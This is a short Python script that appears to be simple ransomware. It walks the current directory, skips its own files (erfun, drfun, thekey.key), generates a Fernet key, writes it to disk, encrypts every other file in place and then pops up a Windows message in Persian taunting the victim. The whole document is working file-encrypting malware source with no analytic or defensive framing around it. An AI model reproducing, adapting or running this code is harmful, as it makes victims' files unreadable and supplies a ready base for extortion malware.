#
import os
from cryptography.fernet import Fernet
#

files = []

for file in os.listdir():
	if file == "erfun.py" or file == "thekey.key" or file == "drfun.py" or file == "t" or file == "erfun.exe" or file == "drfun.exe" or file == "t15":
		continue
	if os.path.isfile(file):
		files.append(file)

print(files)

with open("thekey.key", "rb") as key:
	secretkey = key.read()



key = Fernet.generate_key()
with open("thekey.key", "wb") as thekey:
	thekey.write(key)

for file in files:
	with open(file, "rb") as thefile:
		contents = thefile.read()
	contents_encrypted = Fernet(key).encrypt(contents)
	with open(file, "wb") as thefile:
		thefile.write(contents_encrypted)

os.system("msg * گول خوردی بدبخت")
